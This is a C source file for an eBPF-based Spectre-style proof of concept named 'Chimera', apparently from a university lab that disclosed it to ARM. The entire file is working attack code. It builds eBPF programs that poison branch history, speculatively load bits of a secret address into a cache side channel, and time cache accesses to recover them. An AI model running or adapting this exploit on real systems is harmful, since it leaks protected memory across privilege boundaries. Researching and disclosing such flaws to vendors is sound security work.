/*
 * Chimera: Spectre-BSE PoC based on eBPF
 * 
 * Thursday, January 22nd 2025
 *
 * Yuhui Zhu - yuhui.zhu@santannapisa.it
 * Alessandro Biondi - alessandro.biondi@santannapisa.it
 *
 * ReTiS Lab, Scuola Superiore Sant'Anna
 * Pisa, Italy
 * 
 * This copy is tested on Cortex-A76 and distributed to ARM 
 * for vulnerability evaluation.
 */

#include "ebpf_helper.h"
#include "ebpf_progs.h"
#include "ebpf_poc.h"

#define EBPF_COND_BRANCH_DEFINE(name) int idx_##name, idx_##name##_target;
#define EBPF_COND_BRANCH_SOURCE(name, idx) idx_##name = idx++;
#define EBPF_COND_BRANCH_TARGET(name, idx) idx_##name##_target = idx; 
#define EBPF_COND_BRANCH_OFFSET(name) (idx_##name##_target - idx_##name - 1)
#define EBPF_COND_BRANCH_INSN(name, op, reg, imm) insns[idx_##name] = BPF_JMP_IMM(op, reg, imm, EBPF_COND_BRANCH_OFFSET(name));
#define EBPF_PADDING_XOR(insn_idx, reg, nr_insns) \
    for (int padding = 0; padding < nr_insns; padding++) \
        insns[insn_idx++] = BPF_ALU64_REG(BPF_XOR, reg, reg);

/**
 * environment parameters
 */
int env_page_sz;

/**
 * eBPF handlers
 */
int fd_map_frbuf;
int fd_map_evict_offset;
int fd_map_time;
int fd_map_jmptable;
int fd_map_bh_params;
int fd_map_dummy;
int fd_map_secret;

int fd_prog_evict, sock_prog_evict;
int fd_prog_time, sock_prog_time;
int fd_prog_dbg_load, sock_prog_dbg_load;
int fd_prog_t_safe, sock_prog_t_safe, fd_prog_t_leak;
int fd_prog_bh_populate, sock_prog_victim;

void *ptr_mmap_evset, *ptr_mmap_bh_params, *ptr_mmap_jmptable, *ptr_mmap_dummy, *ptr_mmap_secret;
uint32_t *ptr_mmap_time;

void setup_prog_reload()
{
    int gadget_fd, gadget_sock;
    struct bpf_insn insns_gadget_leak[] = {

        // save context in REG_9
        BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),

        // load frbuf
        BPF_LD_IMM64_RAW_FULL(BPF_REG_8, 2, 0, 0, fd_map_frbuf, 0),

        // now = get_ns()
        BPF_EMIT_CALL(BPF_FUNC_ktime_get_ns),
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),

        // Measure access time to fr_buf[(entry&0xff)*STRIDE]
        BPF_MOV64_REG(BPF_REG_0, BPF_REG_8),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_0, PR_OFFSET_0),
        BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_0, 0),

        // R6 = delta = get_ns() - now
        BPF_EMIT_CALL(BPF_FUNC_ktime_get_ns),
        BPF_ALU64_REG(BPF_SUB, BPF_REG_0, BPF_REG_7),
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),
        
        // ==============================================
        // now = get_ns()
        BPF_EMIT_CALL(BPF_FUNC_ktime_get_ns),
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),

        // Measure access time to fr_buf[(entry&0xff)*STRIDE]
        BPF_MOV64_REG(BPF_REG_0, BPF_REG_8),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_0, PR_OFFSET_1),
        BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_0, 0),

        // R7 = delta = get_ns() - now
        BPF_EMIT_CALL(BPF_FUNC_ktime_get_ns),
        BPF_ALU64_REG(BPF_SUB, BPF_REG_0, BPF_REG_7),
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),

        // ==============================================
        // load dummy
        BPF_LD_IMM64_RAW_FULL(BPF_REG_8, 2, 0, 0, fd_map_dummy, 0),

        // now = get_ns()
        BPF_EMIT_CALL(BPF_FUNC_ktime_get_ns),
        BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),

        // Measure access time to dummy[(entry&0xff)*STRIDE]
        BPF_MOV64_REG(BPF_REG_0, BPF_REG_8),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_0, PR_OFFSET_1),
        BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_0, 0),

        // R6 = delta = get_ns() - now
        BPF_EMIT_CALL(BPF_FUNC_ktime_get_ns),
        BPF_ALU64_REG(BPF_SUB, BPF_REG_0, BPF_REG_9),
        BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),

        // ==============================================

        // update access latency for bit=0
        // arg1 = map fd
        BPF_LD_MAP_FD(BPF_REG_ARG1, fd_map_time),

        // arg2 = key
        BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
        BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 0),

        // arg3 = value = delta
        BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_ARG2),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, -4),
        BPF_STX_MEM(BPF_W, BPF_REG_ARG3, BPF_REG_6, 0),

        // arg4 = flag = BPF_ANY
        BPF_MOV64_IMM(BPF_REG_ARG4, BPF_ANY),

        // call map_update_elem
        BPF_EMIT_CALL(BPF_FUNC_map_update_elem),

        // update access latency for bit=1
        // arg1 = map fd
        BPF_LD_MAP_FD(BPF_REG_ARG1, fd_map_time),

        // arg2 = key
        BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
        BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 1),

        // arg3 = value = delta
        BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_ARG2),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, -4),
        BPF_STX_MEM(BPF_W, BPF_REG_ARG3, BPF_REG_7, 0),

        // arg4 = flag = BPF_ANY
        BPF_MOV64_IMM(BPF_REG_ARG4, BPF_ANY),

        // call map_update_elem
        BPF_EMIT_CALL(BPF_FUNC_map_update_elem),


        // update access latency for dummy ptr
        // arg1 = map fd
        BPF_LD_MAP_FD(BPF_REG_ARG1, fd_map_time),

        // arg2 = key
        BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
        BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 2),

        // arg3 = value = delta
        BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_ARG2),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, -4),
        BPF_STX_MEM(BPF_W, BPF_REG_ARG3, BPF_REG_9, 0),

        // arg4 = flag = BPF_ANY
        BPF_MOV64_IMM(BPF_REG_ARG4, BPF_ANY),

        // call map_update_elem
        BPF_EMIT_CALL(BPF_FUNC_map_update_elem),

        // Exit
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };
    gadget_fd = prog_load(insns_gadget_leak, ARRSIZE(insns_gadget_leak));
    gadget_sock = create_filtered_socket_fd(gadget_fd);
    trigger_ebpf(gadget_sock, 1);
    fd_prog_time = gadget_fd;
    sock_prog_time = gadget_sock;
}

#define SZ_BP_SLOT 8
void setup_prog_victim(int nr_bh, int sz_bcond_offset)
{
    int insns_len = 0;
    int insn_bound_check = 0;
    struct bpf_insn insns[10000];

    int idx_exit_target, idx_exit0, idx_exit1, idx_exit2;
    EBPF_COND_BRANCH_DEFINE(bc_take_shortcut);
    EBPF_COND_BRANCH_DEFINE(bc_init);
    EBPF_COND_BRANCH_DEFINE(bc_exit0);
    EBPF_COND_BRANCH_DEFINE(bc_bh_shuffle);
    EBPF_COND_BRANCH_DEFINE(bc_exit1);
    EBPF_COND_BRANCH_DEFINE(bc_load);

    // R0: *load_params.offset*: &SECRET or offset_dummy
    // R1: ctx
    // R2: *load_params.rsh*
    // R3: *load_params.base*: 0 or fd_map_dummy
    // R4: param a
    // R5: param b
    // R6: param c
    // R7: param d
    // R8: fd_map_bh_params
    // R9: junk, zero
    insns[insns_len++] = BPF_MOV64_IMM(BPF_REG_9, 0);

    insns[insns_len++] = BPF_RAW_INSN(BPF_LD | BPF_DW | BPF_IMM, BPF_REG_8, 2, 0, fd_map_bh_params);
    insns[insns_len++] = BPF_RAW_INSN(0, 0, 0, 0, 0);
    // please, fetch them early
    insns[insns_len++] = BPF_LDX_MEM(BPF_B, BPF_REG_5, BPF_REG_8, PARAM_OFFSET_ESC);
    insns[insns_len++] = BPF_LDX_MEM(BPF_B, BPF_REG_6, BPF_REG_8, PARAM_OFFSET_SHUFFLE_BH);
    insns[insns_len++] = BPF_LDX_MEM(BPF_B, BPF_REG_7, BPF_REG_8, PARAM_OFFSET_TAKE_SC);

    // load_params = (base=fd_map_dummy, offset=PR_OFFSET_1, rsh=rsh)
    insns[insns_len++] = BPF_RAW_INSN(BPF_LD | BPF_DW | BPF_IMM, BPF_REG_3, 2, 0, fd_map_dummy);
    insns[insns_len++] = BPF_RAW_INSN(0, 0, 0, 0, 0);
    insns[insns_len++] = BPF_MOV64_IMM(BPF_REG_0, PR_OFFSET_1); // a dummy offset
    insns[insns_len++] = BPF_LDX_MEM(BPF_B, BPF_REG_2, BPF_REG_8, PARAM_OFFSET_RSH);

    // populate BHB
    insns[insns_len++] = BPF_LDX_MEM(BPF_W, BPF_REG_8, BPF_REG_1, 0);
    insns[insns_len++] = BPF_ALU64_IMM(BPF_AND, BPF_REG_8, 1);
    for (int i=0; i<nr_bh; i++)
    {
        insns[insns_len++] = BPF_JMP_IMM(BPF_JNE, BPF_REG_8, 0x1, sz_bcond_offset);
        EBPF_PADDING_XOR(insns_len, BPF_REG_9, sz_bcond_offset);
    }

    // EBPF_PADDING_XOR(insns_len, BPF_REG_9, 32);

    insns[insns_len++] = BPF_RAW_INSN(BPF_LD | BPF_DW | BPF_IMM, BPF_REG_8, 2, 0, fd_map_bh_params);
    insns[insns_len++] = BPF_RAW_INSN(0, 0, 0, 0, 0);
    insns[insns_len++] = BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_8, PARAM_OFFSET_SET_PTR);
    
    // === **STARTS HERE** ===
    EBPF_COND_BRANCH_SOURCE(bc_take_shortcut, insns_len); // BPF_JMP_IMM(BPF_JNE, BPF_REG_7, 0x0, offset);

    EBPF_PADDING_XOR(insns_len, BPF_REG_9, SZ_BP_SLOT);

    EBPF_COND_BRANCH_SOURCE(bc_init, insns_len); // BPF_JMP_IMM(BPF_JNE, BPF_REG_4, 0x0, offset);
    // load_params = (base=0, offset=&SECRET, rsh=rsh)
    insns[insns_len++] = BPF_MOV64_IMM(BPF_REG_3, 0);
    insns[insns_len++] = BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8, PARAM_OFFSET_PTR);
    insns[insns_len++] = BPF_LDX_MEM(BPF_B, BPF_REG_2, BPF_REG_8, PARAM_OFFSET_RSH);
    EBPF_PADDING_XOR(insns_len, BPF_REG_9, SZ_BP_SLOT);
    EBPF_COND_BRANCH_TARGET(bc_init, insns_len);
    
    EBPF_PADDING_XOR(insns_len, BPF_REG_9, SZ_BP_SLOT);
    
    insns[insns_len++] = BPF_MOV64_REG(BPF_REG_9, BPF_REG_5);
    insns[insns_len++] = BPF_ALU64_REG(BPF_OR, BPF_REG_9, BPF_REG_4);
    EBPF_COND_BRANCH_SOURCE(bc_exit0, insns_len); // BPF_JMP_IMM(BPF_JNE, BPF_REG_9, 0x0, offset);
    EBPF_PADDING_XOR(insns_len, BPF_REG_9, SZ_BP_SLOT);
    idx_exit0 = insns_len++;
    EBPF_COND_BRANCH_TARGET(bc_exit0, insns_len);
    
    EBPF_PADDING_XOR(insns_len, BPF_REG_9, SZ_BP_SLOT);

    // BH-shuffing: do a TAKEN branch in speculated world 
    // so subsequent branches will be predicted with no matching branch histories
    EBPF_COND_BRANCH_SOURCE(bc_bh_shuffle, insns_len); // BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 0x0, offset);
    EBPF_PADDING_XOR(insns_len, BPF_REG_9, SZ_BP_SLOT);
    EBPF_COND_BRANCH_TARGET(bc_bh_shuffle, insns_len);
    EBPF_COND_BRANCH_TARGET(bc_take_shortcut, insns_len);

    EBPF_PADDING_XOR(insns_len, BPF_REG_9, SZ_BP_SLOT);

    EBPF_COND_BRANCH_SOURCE(bc_exit1, insns_len); // BPF_JMP_IMM(BPF_JEQ, BPF_REG_5, 0x0, offset);
    EBPF_PADDING_XOR(insns_len, BPF_REG_9, SZ_BP_SLOT);
    idx_exit1 = insns_len++; 
    EBPF_COND_BRANCH_TARGET(bc_exit1, insns_len);

    EBPF_PADDING_XOR(insns_len, BPF_REG_9, SZ_BP_SLOT);

    EBPF_COND_BRANCH_SOURCE(bc_load, insns_len); // BPF_JMP_IMM(BPF_JEQ, BPF_REG_4, 0x0, offset);

    EBPF_PADDING_XOR(insns_len, BPF_REG_9, SZ_BP_SLOT);
    
    // === leak gadget
    // load one bit from initialized address
    // bc_init NT: byte = memload(&SECRET)
    // bc_init TT: byte = memload(&fd_map_dummy[PR_OFFSET_1])
    insns[insns_len++] = BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_3);
    insns[insns_len++] = BPF_LDX_MEM(BPF_B, BPF_REG_0, BPF_REG_0, 0); // r0 = SECRET
    // bit = secret >> load_params.rsh & 1
    insns[insns_len++] = BPF_ALU64_REG(BPF_RSH, BPF_REG_0, BPF_REG_2);
    insns[insns_len++] = BPF_ALU64_IMM(BPF_AND, BPF_REG_0, 1); // r0 = (r0 >> r2) & 1
    
    // encode bit into ide channel 
    // memload(fd_map_frbuf + BASE_OFFSET + bit*PR_STRIDE)
    insns[insns_len++] = BPF_RAW_INSN(BPF_LD | BPF_DW | BPF_IMM, BPF_REG_9, 2, 0, fd_map_frbuf);
    insns[insns_len++] = BPF_RAW_INSN(0, 0, 0, 0, 0);
    insns[insns_len++] = BPF_ALU64_IMM(BPF_ADD, BPF_REG_9, env_page_sz);
    insns[insns_len++] = BPF_ALU64_IMM(BPF_MUL, BPF_REG_0, PR_STRIDE);
    insns[insns_len++] = BPF_ALU64_REG(BPF_ADD, BPF_REG_9, BPF_REG_0);
    insns[insns_len++] = BPF_LDX_MEM(BPF_DW, BPF_REG_9, BPF_REG_9, 0);
    // === leak gadget

    EBPF_PADDING_XOR(insns_len, BPF_REG_9, SZ_BP_SLOT);

    EBPF_COND_BRANCH_TARGET(bc_load, insns_len);

    idx_exit_target = insns_len;
    insns[insns_len++] = BPF_MOV64_IMM(BPF_REG_0, 0);
    insns[insns_len++] = BPF_EXIT_INSN();

    // setup branches
    insns[idx_exit0] = BPF_JMP_IMM(BPF_JA, 0, 0, (idx_exit_target-idx_exit0-1));
    insns[idx_exit1] = BPF_JMP_IMM(BPF_JA, 0, 0, (idx_exit_target-idx_exit1-1));
    EBPF_COND_BRANCH_INSN(bc_take_shortcut, BPF_JNE, BPF_REG_7, 0x0);
    EBPF_COND_BRANCH_INSN(bc_init, BPF_JNE, BPF_REG_4, 0x0);
    EBPF_COND_BRANCH_INSN(bc_exit0, BPF_JNE, BPF_REG_9, 0x0);
    EBPF_COND_BRANCH_INSN(bc_bh_shuffle, BPF_JNE, BPF_REG_6, 0x0);
    EBPF_COND_BRANCH_INSN(bc_exit1, BPF_JEQ, BPF_REG_5, 0x0);
    EBPF_COND_BRANCH_INSN(bc_load, BPF_JEQ, BPF_REG_4, 0x0);

    fd_prog_bh_populate = prog_load(insns, insns_len);
    sock_prog_victim = create_filtered_socket_fd(fd_prog_bh_populate);
    trigger_ebpf(sock_prog_victim, 1);
}

void setup_prog_dbg_load()
{
    struct bpf_insn insns_gadget_leak[] = {

        // load frbuf
        BPF_LD_IMM64_RAW_FULL(BPF_REG_8, 2, 0, 0, fd_map_frbuf, 0),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, PR_OFFSET_1),
        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_8, 0),

        // Exit
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };
    fd_prog_dbg_load = prog_load(insns_gadget_leak, ARRSIZE(insns_gadget_leak));
    sock_prog_dbg_load = create_filtered_socket_fd(fd_prog_dbg_load);
    trigger_ebpf(sock_prog_dbg_load, 1);
}